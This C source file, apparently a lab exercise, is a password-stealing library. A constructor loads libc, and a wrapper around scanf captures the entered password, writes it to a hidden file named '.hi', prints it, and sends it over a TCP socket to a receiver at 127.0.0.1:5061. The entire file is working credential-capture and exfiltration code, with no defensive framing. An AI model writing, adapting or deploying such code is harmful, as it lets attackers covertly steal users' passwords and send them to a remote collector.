#include <stdio.h>
#include <stdarg.h>
#include <dlfcn.h>
#include <string.h>
#include <errno.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define OBJ_PATH "/lib/x86_64-linux-gnu/libc.so.6"
#define HIDDEN_FILE ".hi"
#define RECEIVER_PORT 5061
#define RECEIVER_IP_ADDRESS "127.0.0.1"

typedef int (*sym)(const char *, ...);
void *handle;
FILE *fd;
static void myinit() __attribute__((constructor));
static void mydest() __attribute__((destructor));
int send_file();

void myinit()
{
	fd = fopen(HIDDEN_FILE, "w");
	if (fd == NULL)
	{
		fprintf(stderr, "Failed to open file: %s\n", HIDDEN_FILE);
		return;
	}
	handle = dlopen(OBJ_PATH, RTLD_LAZY);
	if (handle == NULL)
	{
		fprintf(stderr, "Failed to load library: %s\n", OBJ_PATH);
		return;
	}
}

void mydest()
{
	if (handle != NULL)
	{
		dlclose(handle);
	}
	// if (fd != NULL)
	// {
	// 	fclose(fd);
	// }
}

int myscanf(const char *format, ...)
{
	sym orig_scanf;
	char password[1000];
	memset(password, 0, 1000);

	orig_scanf = (sym)dlsym(handle, "scanf");
	if (orig_scanf == NULL)
	{
		fprintf(stderr, "Failed to find function: scanf\n");
		return EOF;
	}
	orig_scanf(format, password);

	if (!fd)
	{
		printf("Error: could not open file!\n");
		return -1;
	}

	fprintf(fd, "%s", password); // write password to file
		
	fclose(fd);

	printf("The password is: %s\n", password);

	if (send_file() == -1)
	{
		printf("Error: could not send the file!\n");
		return -1;
	}

	return strlen(password); // return length of password
}

int send_file()
{
	// open the file
	FILE *file = fopen(HIDDEN_FILE, "r");
	if (file == NULL)
	{
		fprintf(stderr, "Failed open the file: %s\n", HIDDEN_FILE);
		return -1;
	}

	// calculate the size of the file
	fseek(file, 0L, SEEK_END);
	int size_of_file = ftell(file);
	fseek(file, 0L, SEEK_SET);
	// copy the file to array of chars
	char filedata[size_of_file];
	fread(filedata, sizeof(char), size_of_file, file);
	// close the file
	fclose(file);
	printf("the file is: %d\n", size_of_file);

	// creating a new socket
	int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	// Handle case where couldn't create a socket
	if (sock == -1)
	{
		printf("Could not create socket : %d\n", errno);
		return -1;
	}

	struct sockaddr_in receiverAddress;
	memset(&receiverAddress, 0, sizeof(receiverAddress));
	receiverAddress.sin_family = AF_INET;
	receiverAddress.sin_port = htons(RECEIVER_PORT);

	int rval = inet_pton(AF_INET, (const char *)RECEIVER_IP_ADDRESS, &receiverAddress.sin_addr);
	if (rval <= 0)
	{
		printf("inet_pton() failed\n");
		return -1;
	}

	// Make a connection to the receiver with socket SendingSocket.
	int connectResult = connect(sock, (struct sockaddr *)&receiverAddress, sizeof(receiverAddress));
	if (connectResult == -1)
	{
		printf("connect() failed with error code : %d\n", errno);
		// cleanup the socket;
		close(sock);
		return -1;
	}

	printf("connected to the receiver\n");

	// Sending the file
	int bytesSent;
	bytesSent = send(sock, filedata, size_of_file, 0);

	if (bytesSent == -1)
	{
		printf("send() failed with error code : %d\n", errno);
		return -1;
	}
	if (bytesSent == 0)
	{
		printf("peer has closed the TCP connection prior to send().\n");
		return -1;
	}
	// if the function didn't send all the data:
	if (bytesSent < size_of_file)
	{
		printf("Only %d bytes sent of %d bytes \n", bytesSent, size_of_file);
		return -1;
	}
	printf("The file sent successfully");

	// close the connection
	close(sock);
	return 0;
}

int main()
{
	char password[1000];
	myscanf("%s ", password);
}